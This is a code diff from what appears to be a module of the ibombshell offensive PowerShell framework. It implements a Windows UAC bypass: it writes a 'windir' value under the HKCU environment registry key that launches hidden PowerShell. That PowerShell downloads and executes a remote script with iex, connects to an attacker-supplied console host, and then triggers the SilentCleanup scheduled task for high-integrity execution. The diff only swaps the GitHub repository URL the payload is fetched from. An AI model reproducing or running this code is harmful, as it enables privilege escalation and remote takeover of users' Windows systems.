@@ -42,7 +42,7 @@ class CustomModule(Module):
   }}
 
     #Create windir injection
-    New-ItemProperty -Name 'windir' -Path 'hkcu:\environment' -Value "cmd /K c:\windows\system32\windowspowershell\\v1.0\powershell.exe -W Hidden -C ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console');console -silently -uriconsole http://{}:{}"" && REM "
+    New-ItemProperty -Name 'windir' -Path 'hkcu:\environment' -Value "cmd /K c:\windows\system32\windowspowershell\\v1.0\powershell.exe -W Hidden -C ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/lucferbux/ibombshell/master/console');console -silently -uriconsole http://{}:{}"" && REM "
 
     #Task (high integrity)
     schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
